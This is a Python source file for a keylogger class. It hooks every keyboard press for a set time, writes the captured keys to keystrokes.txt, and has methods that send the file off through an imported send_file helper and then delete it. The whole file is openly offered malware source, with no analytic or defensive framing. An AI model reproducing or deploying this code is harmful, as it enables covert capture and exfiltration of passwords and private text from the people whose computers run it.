import time
import keyboard
from send_file import send_file
from removefile import removefile

class keylogger:
    def __init__(self, duration):
        self.duration = duration
        self.keys = []

    def start(self):
        print("Starting keylogger...")
        keyboard.on_press(self.record)
        time.sleep(self.duration)
        keyboard.unhook_all()
        self.save()

    def record(self, key):
        if key.name == 'enter':
            self.keys.append('\n')
        elif key.name == 'space':
            self.keys.append(' ')
        elif key.name == 'tab':
            self.keys.append('\t')
        else:
            self.keys.append(key.name)

    def save(self):
        print("Saving keystrokes to file...")
        with open("keystrokes.txt", "w") as f:
            f.write("".join(self.keys))
        print("Keystrokes saved to file.")

    def sendfile(self):
        send_file("keystrokes.txt")

    def remove(self):
        removefile("keystrokes.txt")

